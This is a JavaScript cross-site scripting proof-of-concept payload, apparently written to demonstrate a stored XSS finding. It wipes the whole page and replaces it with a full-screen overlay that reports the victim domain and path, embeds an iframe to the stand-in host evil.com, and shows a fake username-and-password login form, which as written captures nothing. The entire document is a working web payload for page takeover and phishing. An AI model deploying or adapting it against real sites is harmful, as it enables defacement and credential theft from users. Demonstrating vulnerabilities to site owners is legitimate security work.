(function () {
  // 1️⃣ Destrxxeoy entire document (not just body)
  document.documentElement.innerHTML = `
    <head>
      <title>XSS PoC</title>
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <style>
        html, body {
          margin: 0 !important;
          padding: 0 !important;
          width: 100% !important;
          height: 100% !important;
          overflow: hidden !important;
          background: #111 !important;
          font-family: Arial, sans-serif !important;
        }
        * {
          box-sizing: border-box !important;
        }
      </style>
    </head>
    <body></body>
  `;

  // 2️⃣ Absolute top-level container
  const wrapper = document.createElement('div');
  wrapper.style.cssText = `
    position: fixed;
    inset: 0;
    z-index: 2147483647;
    display: flex;
    background: #111;
    color: #fff;
  `;

  const panel = `
    flex:1;
    padding:20px;
    border-right:1px solid #333;
    overflow:auto;
  `;

  // Panel A — Proof
  const p1 = document.createElement('div');
  p1.style.cssText = panel;
  p1.innerHTML = `
    <h2>✅ XSS — Full DOM Takeover</h2>
    <p>This content replaced the <b>entire document</b>.</p>
    <p><b>Domain:</b> ${location.host}</p>
    <p><b>Path:</b> ${location.pathname}</p>
    <p><b>Time:</b> ${new Date()}</p>
  `;

  // Panel B — Iframe injection
  const p2 = document.createElement('div');
  p2.style.cssText = panel;
  p2.innerHTML = `
    <h2>🧩 Arbitrary Iframe Injection</h2>
    <iframe
      src="https://evil.com"
      style="width:100%;height:80%;border:1px solid #555;background:#fff">
    </iframe>
  `;

  // Panel C — Interactive phishing UI (safe PoC)
  const p3 = document.createElement('div');
  p3.style.cssText = panel;
  p3.innerHTML = `
    <h2>⚠ Phishing UI Capability (PoC)</h2>
    <p style="color:#ff9800">Interactive demo only — no data processed.</p>

    <form onsubmit="return false">
      <label>Username</label>
      <input type="text" style="width:100%;padding:8px;margin:6px 0">

      <label>Password</label>
      <input type="password" style="width:100%;padding:8px;margin:6px 0">

      <button
        type="button"
        style="width:100%;padding:10px;background:#1976d2;color:#fff;border:none"
        onclick="alert('PoC only — no credentials captured')">
        Login
      </button>
    </form>

    <p style="font-size:12px;color:#aaa;margin-top:10px">
      Demonstrates full page replacement via Stored XSS.
      <script>alert("XSS EXECUTED")</script>
    </p>
  `;

  wrapper.appendChild(p1);
  wrapper.appendChild(p2);
  wrapper.appendChild(p3);
  document.body.appendChild(wrapper);

})();
